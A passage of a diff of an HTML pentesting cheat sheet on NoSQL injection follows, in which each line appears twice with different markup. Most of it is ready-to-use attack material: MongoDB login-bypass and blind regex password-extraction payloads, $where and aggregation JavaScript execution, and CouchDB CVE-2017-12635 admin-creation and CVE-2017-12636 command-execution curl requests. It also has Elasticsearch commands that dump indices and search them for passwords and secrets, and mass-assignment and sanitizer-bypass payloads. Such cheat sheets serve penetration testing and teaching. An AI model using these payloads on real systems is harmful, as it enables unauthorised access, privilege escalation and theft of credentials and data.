+</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;username&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;$regex&#34;</span><span class=p>:</span> <span class=s2>&#34;^adm&#34;</span><span class=p>},</span> <span class=nt>&#34;password&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;$ne&#34;</span><span class=p>:</span> <span class=kc>null</span><span class=p>}}</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;username&#34;</span><span class=p>:</span> <span class=s2>&#34;admin&#34;</span><span class=p>,</span> <span class=nt>&#34;password&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;$regex&#34;</span><span class=p>:</span> <span class=s2>&#34;.*&#34;</span><span class=p>}}</span>
+</span></span></code></pre></div><h3 id=url-encoded-form-variant data-heading-permalink=true><span class=heading-content>URL-encoded form variant</span>
+<a class=heading-permalink href=#url-encoded-form-variant aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>When the endpoint accepts form-encoded data, PHP/Express parse <code>key[$ne]=x</code> as <code>{key: {$ne: 'x'}}</code>:</p><pre tabindex=0><code>POST /login
 username=admin&amp;password[$ne]=x
-</code></pre><p>Always try both JSON and form-encoded variants - apps that filter one often forget the other.</p>
-<h2 id="iii-nosqlmap-and-nosqli" data-heading-permalink="true"><span class="heading-content">iii. NoSQLMap and nosqli</span>
-    <a class="heading-permalink" href="#iii-nosqlmap-and-nosqli" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>NoSQLMap - sqlmap-style automation for NoSQL:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nosqlmap.py
-</span></span><span class="line"><span class="cl"><span class="c1">## Interactive menu, picks attacks based on detection</span>
-</span></span></code></pre></div><p>nosqli - modern Go-based scanner, focused on MongoDB:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nosqli scan -t <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/api/login&#34;</span> --request request.txt
-</span></span><span class="line"><span class="cl">nosqli scan -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/api/users?id=1&#34;</span>
-</span></span></code></pre></div><p>NoSQLi-Injection-Wordlists for fuzzing with ffuf:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/login&#34;</span> -X POST -H <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -d <span class="s1">&#39;{&#34;username&#34;:&#34;FUZZ&#34;,&#34;password&#34;:&#34;x&#34;}&#39;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -w nosql-payloads.txt -mc all -fs &lt;baseline&gt;
-</span></span></code></pre></div><h2 id="iv-blind-extraction-regex-sidechannel" data-heading-permalink="true"><span class="heading-content">iv. Blind extraction (regex sidechannel)</span>
-    <a class="heading-permalink" href="#iv-blind-extraction-regex-sidechannel" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When auth bypass works but you want to enumerate actual credentials/data:</p>
-<pre tabindex="0"><code>{&#34;username&#34;: &#34;admin&#34;, &#34;password&#34;: {&#34;$regex&#34;: &#34;^a&#34;}}
+</code></pre><p>Always try both JSON and form-encoded variants - apps that filter one often forget the other.</p><h2 id=iii-nosqlmap-and-nosqli data-heading-permalink=true><span class=heading-content>iii. NoSQLMap and nosqli</span>
+<a class=heading-permalink href=#iii-nosqlmap-and-nosqli aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>NoSQLMap - sqlmap-style automation for NoSQL:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nosqlmap.py
+</span></span><span class=line><span class=cl><span class=c1>## Interactive menu, picks attacks based on detection</span>
+</span></span></code></pre></div><p>nosqli - modern Go-based scanner, focused on MongoDB:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nosqli scan -t <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/api/login&#34;</span> --request request.txt
+</span></span><span class=line><span class=cl>nosqli scan -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/api/users?id=1&#34;</span>
+</span></span></code></pre></div><p>NoSQLi-Injection-Wordlists for fuzzing with ffuf:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/login&#34;</span> -X POST -H <span class=s2>&#34;Content-Type: application/json&#34;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  -d <span class=s1>&#39;{&#34;username&#34;:&#34;FUZZ&#34;,&#34;password&#34;:&#34;x&#34;}&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  -w nosql-payloads.txt -mc all -fs &lt;baseline&gt;
+</span></span></code></pre></div><h2 id=iv-blind-extraction-regex-sidechannel data-heading-permalink=true><span class=heading-content>iv. Blind extraction (regex sidechannel)</span>
+<a class=heading-permalink href=#iv-blind-extraction-regex-sidechannel aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When auth bypass works but you want to enumerate actual credentials/data:</p><pre tabindex=0><code>{&#34;username&#34;: &#34;admin&#34;, &#34;password&#34;: {&#34;$regex&#34;: &#34;^a&#34;}}
 {&#34;username&#34;: &#34;admin&#34;, &#34;password&#34;: {&#34;$regex&#34;: &#34;^b&#34;}}
 ...
-</code></pre><p>The response is &ldquo;login success&rdquo; or &ldquo;login fail&rdquo; depending on whether the password starts with that character. Walk the string char by char.</p>
-<p>Or via boolean-blind on any other field:</p>
-<pre tabindex="0"><code>{&#34;email&#34;: &#34;victim@target.com&#34;, &#34;tokens&#34;: {&#34;$regex&#34;: &#34;^abc&#34;}}
-</code></pre><p>Compare response sizes / status codes / behaviors between true and false branches.</p>
-<h2 id="v-where-mongo-lets-you-do-worse" data-heading-permalink="true"><span class="heading-content">v. Where Mongo lets you do worse</span>
-    <a class="heading-permalink" href="#v-where-mongo-lets-you-do-worse" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<h3 id="where-server-side-javascript" data-heading-permalink="true"><span class="heading-content"><code>$where</code> (server-side JavaScript)</span>
-    <a class="heading-permalink" href="#where-server-side-javascript" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>If the app uses <code>$where</code> with user input, you get JS execution in the DB context:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;$where&#34;</span><span class="p">:</span> <span class="s2">&#34;function() { return this.username == &#39;admin&#39; &amp;&amp; sleep(5000) }&#34;</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;$where&#34;</span><span class="p">:</span> <span class="s2">&#34;function() { return this.password.match(/^a/) }&#34;</span><span class="p">}</span>
-</span></span></code></pre></div><p>Modern MongoDB disables JS engine by default. When enabled, this is direct DB-level RCE.</p>
-<h3 id="aggregation-pipeline-injection" data-heading-permalink="true"><span class="heading-content">Aggregation pipeline injection</span>
-    <a class="heading-permalink" href="#aggregation-pipeline-injection" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>When user input goes into <code>$match</code>, <code>$lookup</code>, etc. without sanitization:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;$match&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;$expr&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;$function&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;body&#34;</span><span class="p">:</span> <span class="s2">&#34;function() { return ... }&#34;</span><span class="p">,</span> <span class="nt">&#34;args&#34;</span><span class="p">:</span> <span class="p">[],</span> <span class="nt">&#34;lang&#34;</span><span class="p">:</span> <span class="s2">&#34;js&#34;</span><span class="p">}}}</span>
-</span></span></code></pre></div><p>Same JS execution path. Test with <code>$expr</code> operators in any aggregation parameter.</p>
-<h3 id="mongo-express-misconfig" data-heading-permalink="true"><span class="heading-content">Mongo Express misconfig</span>
-    <a class="heading-permalink" href="#mongo-express-misconfig" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>If the target deployed Mongo Express (web admin UI) without auth, it&rsquo;s full DB access:</p>
-<pre tabindex="0"><code>$T:8081/    → Mongo Express UI
+</code></pre><p>The response is &ldquo;login success&rdquo; or &ldquo;login fail&rdquo; depending on whether the password starts with that character. Walk the string char by char.</p><p>Or via boolean-blind on any other field:</p><pre tabindex=0><code>{&#34;email&#34;: &#34;victim@target.com&#34;, &#34;tokens&#34;: {&#34;$regex&#34;: &#34;^abc&#34;}}
+</code></pre><p>Compare response sizes / status codes / behaviors between true and false branches.</p><h2 id=v-where-mongo-lets-you-do-worse data-heading-permalink=true><span class=heading-content>v. Where Mongo lets you do worse</span>
+<a class=heading-permalink href=#v-where-mongo-lets-you-do-worse aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><h3 id=where-server-side-javascript data-heading-permalink=true><span class=heading-content><code>$where</code> (server-side JavaScript)</span>
+<a class=heading-permalink href=#where-server-side-javascript aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>If the app uses <code>$where</code> with user input, you get JS execution in the DB context:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;$where&#34;</span><span class=p>:</span> <span class=s2>&#34;function() { return this.username == &#39;admin&#39; &amp;&amp; sleep(5000) }&#34;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;$where&#34;</span><span class=p>:</span> <span class=s2>&#34;function() { return this.password.match(/^a/) }&#34;</span><span class=p>}</span>
+</span></span></code></pre></div><p>Modern MongoDB disables JS engine by default. When enabled, this is direct DB-level RCE.</p><h3 id=aggregation-pipeline-injection data-heading-permalink=true><span class=heading-content>Aggregation pipeline injection</span>
+<a class=heading-permalink href=#aggregation-pipeline-injection aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>When user input goes into <code>$match</code>, <code>$lookup</code>, etc. without sanitization:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;$match&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;$expr&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;$function&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;body&#34;</span><span class=p>:</span> <span class=s2>&#34;function() { return ... }&#34;</span><span class=p>,</span> <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>[],</span> <span class=nt>&#34;lang&#34;</span><span class=p>:</span> <span class=s2>&#34;js&#34;</span><span class=p>}}}</span>
+</span></span></code></pre></div><p>Same JS execution path. Test with <code>$expr</code> operators in any aggregation parameter.</p><h3 id=mongo-express-misconfig data-heading-permalink=true><span class=heading-content>Mongo Express misconfig</span>
+<a class=heading-permalink href=#mongo-express-misconfig aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>If the target deployed Mongo Express (web admin UI) without auth, it&rsquo;s full DB access:</p><pre tabindex=0><code>$T:8081/    → Mongo Express UI
 $T:27017    → MongoDB direct (no encryption, no auth often)
-</code></pre><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mongosh <span class="s2">&#34;mongodb://</span><span class="nv">$T</span><span class="s2">:27017&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## then:</span>
-</span></span><span class="line"><span class="cl">&gt; show dbs
-</span></span><span class="line"><span class="cl">&gt; use app<span class="p">;</span> show collections
-</span></span><span class="line"><span class="cl">&gt; db.users.find<span class="o">()</span>
-</span></span></code></pre></div><h2 id="vi-couchdb" data-heading-permalink="true"><span class="heading-content">vi. CouchDB</span>
-    <a class="heading-permalink" href="#vi-couchdb" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>CouchDB exposes a REST API. Common bugs:</p>
-<h3 id="default-admin-party-no-auth-set" data-heading-permalink="true"><span class="heading-content">Default admin party (no auth set)</span>
-    <a class="heading-permalink" href="#default-admin-party-no-auth-set" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">:5984/_all_dbs&#34;</span>        <span class="c1">## list databases</span>
-</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">:5984/_users/_all_docs&#34;</span>
-</span></span></code></pre></div><h3 id="cve-2017-12635-admin-role-injection" data-heading-permalink="true"><span class="heading-content">CVE-2017-12635 (admin role injection)</span>
-    <a class="heading-permalink" href="#cve-2017-12635-admin-role-injection" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>On unpatched CouchDB &lt;= 1.7.0, duplicate fields in JSON get parsed differently by validator vs final config:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X PUT <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">:5984/_users/org.couchdb.user:atk&#34;</span> -H <span class="s1">&#39;Content-Type: application/json&#39;</span> -d <span class="s1">&#39;{&#34;type&#34;:&#34;user&#34;,&#34;name&#34;:&#34;atk&#34;,&#34;roles&#34;:[&#34;_admin&#34;],&#34;roles&#34;:[],&#34;password&#34;:&#34;x&#34;}&#39;</span>
-</span></span></code></pre></div><h3 id="cve-2017-12636-rce-via-config-endpoint" data-heading-permalink="true"><span class="heading-content">CVE-2017-12636 (RCE via config endpoint)</span>
-    <a class="heading-permalink" href="#cve-2017-12636-rce-via-config-endpoint" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>After admin:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X PUT <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">:5984/_config/query_servers/cmd&#34;</span> -d <span class="s1">&#39;&#34;id &gt;&gt; /tmp/x&#34;&#39;</span>
-</span></span><span class="line"><span class="cl">curl -X PUT <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">:5984/db/test&#34;</span>
-</span></span><span class="line"><span class="cl">curl -X POST <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">:5984/db/_temp_view&#34;</span> -H <span class="s1">&#39;Content-Type: application/json&#39;</span> -d <span class="s1">&#39;{&#34;language&#34;:&#34;cmd&#34;,&#34;map&#34;:&#34;&#34;}&#39;</span>
-</span></span></code></pre></div><h2 id="vii-elasticsearch--opensearch" data-heading-permalink="true"><span class="heading-content">vii. Elasticsearch / OpenSearch</span>
-    <a class="heading-permalink" href="#vii-elasticsearch--opensearch" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>REST API on port 9200. When exposed without auth:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Cluster info:</span>
-</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">:9200/&#34;</span>
-</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">:9200/_cluster/health&#34;</span>
-</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">:9200/_cat/indices?v&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Dump everything in an index:</span>
-</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">:9200/INDEX/_search?pretty&amp;size=10000&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Search across all indices:</span>
-</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">:9200/_all/_search?q=password&amp;pretty&#34;</span>
-</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">:9200/_all/_search?q=secret&amp;pretty&#34;</span>
-</span></span></code></pre></div><p>CVE-2014-3120 (very old): Groovy script execution in older Elastic. Still found on legacy systems.</p>
-<p>CVE-2015-1427 (older still): Groovy sandbox bypass for RCE.</p>
-<p>Search query injection: if the app sends user input to ES query_string, the user can use Lucene query syntax to access fields they shouldn&rsquo;t:</p>
-<pre tabindex="0"><code>?q=username:*&amp;password:*
+</code></pre><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mongosh <span class=s2>&#34;mongodb://</span><span class=nv>$T</span><span class=s2>:27017&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1>## then:</span>
+</span></span><span class=line><span class=cl>&gt; show dbs
+</span></span><span class=line><span class=cl>&gt; use app<span class=p>;</span> show collections
+</span></span><span class=line><span class=cl>&gt; db.users.find<span class=o>()</span>
+</span></span></code></pre></div><h2 id=vi-couchdb data-heading-permalink=true><span class=heading-content>vi. CouchDB</span>
+<a class=heading-permalink href=#vi-couchdb aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>CouchDB exposes a REST API. Common bugs:</p><h3 id=default-admin-party-no-auth-set data-heading-permalink=true><span class=heading-content>Default admin party (no auth set)</span>
+<a class=heading-permalink href=#default-admin-party-no-auth-set aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>:5984/_all_dbs&#34;</span>        <span class=c1>## list databases</span>
+</span></span><span class=line><span class=cl>curl <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>:5984/_users/_all_docs&#34;</span>
+</span></span></code></pre></div><h3 id=cve-2017-12635-admin-role-injection data-heading-permalink=true><span class=heading-content>CVE-2017-12635 (admin role injection)</span>
+<a class=heading-permalink href=#cve-2017-12635-admin-role-injection aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>On unpatched CouchDB &lt;= 1.7.0, duplicate fields in JSON get parsed differently by validator vs final config:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -X PUT <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>:5984/_users/org.couchdb.user:atk&#34;</span> -H <span class=s1>&#39;Content-Type: application/json&#39;</span> -d <span class=s1>&#39;{&#34;type&#34;:&#34;user&#34;,&#34;name&#34;:&#34;atk&#34;,&#34;roles&#34;:[&#34;_admin&#34;],&#34;roles&#34;:[],&#34;password&#34;:&#34;x&#34;}&#39;</span>
+</span></span></code></pre></div><h3 id=cve-2017-12636-rce-via-config-endpoint data-heading-permalink=true><span class=heading-content>CVE-2017-12636 (RCE via config endpoint)</span>
+<a class=heading-permalink href=#cve-2017-12636-rce-via-config-endpoint aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>After admin:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -X PUT <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>:5984/_config/query_servers/cmd&#34;</span> -d <span class=s1>&#39;&#34;id &gt;&gt; /tmp/x&#34;&#39;</span>
+</span></span><span class=line><span class=cl>curl -X PUT <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>:5984/db/test&#34;</span>
+</span></span><span class=line><span class=cl>curl -X POST <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>:5984/db/_temp_view&#34;</span> -H <span class=s1>&#39;Content-Type: application/json&#39;</span> -d <span class=s1>&#39;{&#34;language&#34;:&#34;cmd&#34;,&#34;map&#34;:&#34;&#34;}&#39;</span>
+</span></span></code></pre></div><h2 id=vii-elasticsearch--opensearch data-heading-permalink=true><span class=heading-content>vii. Elasticsearch / OpenSearch</span>
+<a class=heading-permalink href=#vii-elasticsearch--opensearch aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>REST API on port 9200. When exposed without auth:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Cluster info:</span>
+</span></span><span class=line><span class=cl>curl <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>:9200/&#34;</span>
+</span></span><span class=line><span class=cl>curl <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>:9200/_cluster/health&#34;</span>
+</span></span><span class=line><span class=cl>curl <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>:9200/_cat/indices?v&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1>## Dump everything in an index:</span>
+</span></span><span class=line><span class=cl>curl <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>:9200/INDEX/_search?pretty&amp;size=10000&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1>## Search across all indices:</span>
+</span></span><span class=line><span class=cl>curl <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>:9200/_all/_search?q=password&amp;pretty&#34;</span>
+</span></span><span class=line><span class=cl>curl <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>:9200/_all/_search?q=secret&amp;pretty&#34;</span>
+</span></span></code></pre></div><p>CVE-2014-3120 (very old): Groovy script execution in older Elastic. Still found on legacy systems.</p><p>CVE-2015-1427 (older still): Groovy sandbox bypass for RCE.</p><p>Search query injection: if the app sends user input to ES query_string, the user can use Lucene query syntax to access fields they shouldn&rsquo;t:</p><pre tabindex=0><code>?q=username:*&amp;password:*
 ?q=role:admin
-</code></pre><h2 id="viii-redis" data-heading-permalink="true"><span class="heading-content">viii. Redis</span>
-    <a class="heading-permalink" href="#viii-redis" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When Redis is exposed and you have unauth access, the [[02 Service Enum]] Redis section covers the SSH-key-write and webshell-write paths.</p>
-<p>Redis as a NoSQL backend in apps is mostly safe (the queries are typed commands, no injection in the SQL sense). The bugs are in the surrounding logic (cache poisoning, session prediction).</p>
-<h2 id="ix-cassandra--cql" data-heading-permalink="true"><span class="heading-content">ix. Cassandra / CQL</span>
-    <a class="heading-permalink" href="#ix-cassandra--cql" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>CQL injection mirrors SQL injection:</p>
-<pre tabindex="0"><code>SELECT * FROM users WHERE username=&#39;admin&#39; AND token=&#39;X&#39;
-</code></pre><p>Bugs:</p>
-<ul>
-<li><code>'</code> to break out</li>
-<li><code>--</code> for comments</li>
-<li><code>UNION</code> (limited support)</li>
-<li>Time-based delays not native, harder to confirm blind</li>
-</ul>
-<p>Less common, less tooled. If you find Cassandra, the usual SQLi approach with manual probing applies.</p>
-<h2 id="x-tricks-worth-knowing" data-heading-permalink="true"><span class="heading-content">x. Tricks worth knowing</span>
-    <a class="heading-permalink" href="#x-tricks-worth-knowing" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<h3 id="json-vs-form-encoded" data-heading-permalink="true"><span class="heading-content">JSON vs form-encoded</span>
-    <a class="heading-permalink" href="#json-vs-form-encoded" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Always test both. Apps frequently filter one and trust the other.</p>
-<h3 id="type-juggling-in-language-layers" data-heading-permalink="true"><span class="heading-content">Type juggling in language layers</span>
-    <a class="heading-permalink" href="#type-juggling-in-language-layers" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Express+MongoDB:</p>
-<pre tabindex="0"><code>## Form: password=x      -&gt; string &#39;x&#39;
+</code></pre><h2 id=viii-redis data-heading-permalink=true><span class=heading-content>viii. Redis</span>
+<a class=heading-permalink href=#viii-redis aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When Redis is exposed and you have unauth access, the <a href=/cheatsheets/linux-pentesting/02-service-enum/>02 Service Enum</a>
+Redis section covers the SSH-key-write and webshell-write paths.</p><p>Redis as a NoSQL backend in apps is mostly safe (the queries are typed commands, no injection in the SQL sense). The bugs are in the surrounding logic (cache poisoning, session prediction).</p><h2 id=ix-cassandra--cql data-heading-permalink=true><span class=heading-content>ix. Cassandra / CQL</span>
+<a class=heading-permalink href=#ix-cassandra--cql aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>CQL injection mirrors SQL injection:</p><pre tabindex=0><code>SELECT * FROM users WHERE username=&#39;admin&#39; AND token=&#39;X&#39;
+</code></pre><p>Bugs:</p><ul><li><code>'</code> to break out</li><li><code>--</code> for comments</li><li><code>UNION</code> (limited support)</li><li>Time-based delays not native, harder to confirm blind</li></ul><p>Less common, less tooled. If you find Cassandra, the usual SQLi approach with manual probing applies.</p><h2 id=x-tricks-worth-knowing data-heading-permalink=true><span class=heading-content>x. Tricks worth knowing</span>
+<a class=heading-permalink href=#x-tricks-worth-knowing aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><h3 id=json-vs-form-encoded data-heading-permalink=true><span class=heading-content>JSON vs form-encoded</span>
+<a class=heading-permalink href=#json-vs-form-encoded aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Always test both. Apps frequently filter one and trust the other.</p><h3 id=type-juggling-in-language-layers data-heading-permalink=true><span class=heading-content>Type juggling in language layers</span>
+<a class=heading-permalink href=#type-juggling-in-language-layers aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Express+MongoDB:</p><pre tabindex=0><code>## Form: password=x      -&gt; string &#39;x&#39;
 ## Form: password[$ne]=x -&gt; object {$ne: &#39;x&#39;}
 ## JSON: {&#34;password&#34;: {&#34;$ne&#34;: &#34;x&#34;}}  -&gt; same object
-</code></pre><p>PHP+MongoDB has similar nested array parsing.</p>
-<h3 id="_id-enumeration" data-heading-permalink="true"><span class="heading-content"><code>_id</code> enumeration</span>
-    <a class="heading-permalink" href="#_id-enumeration" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>ObjectId is 24 hex chars but NOT random - 4 bytes timestamp, 5 bytes random per host, 3 bytes counter. Predictable bytes mean adjacent IDs are guessable. Pull one user&rsquo;s ID, predict others.</p>
-<h3 id="mass-assignment-via-json" data-heading-permalink="true"><span class="heading-content">Mass assignment via JSON</span>
-    <a class="heading-permalink" href="#mass-assignment-via-json" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Even without injection, JSON-receiving endpoints often accept extra fields:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;newuser&#34;</span><span class="p">,</span> <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;x&#34;</span><span class="p">,</span> <span class="nt">&#34;isAdmin&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">}</span>
-</span></span></code></pre></div><p>Test every endpoint that accepts JSON for fields the form doesn&rsquo;t include. <code>role</code>, <code>isAdmin</code>, <code>_admin</code>, <code>permissions</code>, <code>verified</code>, <code>email_verified</code> - try them all.</p>
-<h3 id="filter-bypass-via-deep-paths" data-heading-permalink="true"><span class="heading-content">Filter bypass via deep paths</span>
-    <a class="heading-permalink" href="#filter-bypass-via-deep-paths" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Some sanitizers check top-level keys only:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:{</span><span class="nt">&#34;nested&#34;</span><span class="p">:{</span><span class="nt">&#34;$ne&#34;</span><span class="p">:</span><span class="s2">&#34;x&#34;</span><span class="p">}}}</span>
-</span></span></code></pre></div><p>Or via array indexing:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:[{</span><span class="nt">&#34;$ne&#34;</span><span class="p">:</span><span class="s2">&#34;x&#34;</span><span class="p">}]}</span>
-</span></span></code></pre></div><h2 id="xi-references" data-heading-permalink="true"><span class="heading-content">xi. References</span>
-    <a class="heading-permalink" href="#xi-references" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<ul>
-<li><a href="https://portswigger.net/web-security/nosql-injection" target="_blank" rel="noopener noreferrer">PortSwigger - NoSQL Injection</a>
-</li>
-<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings - NoSQL Injection</a>
-</li>
-<li><a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection" target="_blank" rel="noopener noreferrer">HackTricks - NoSQL Injection</a>
-</li>
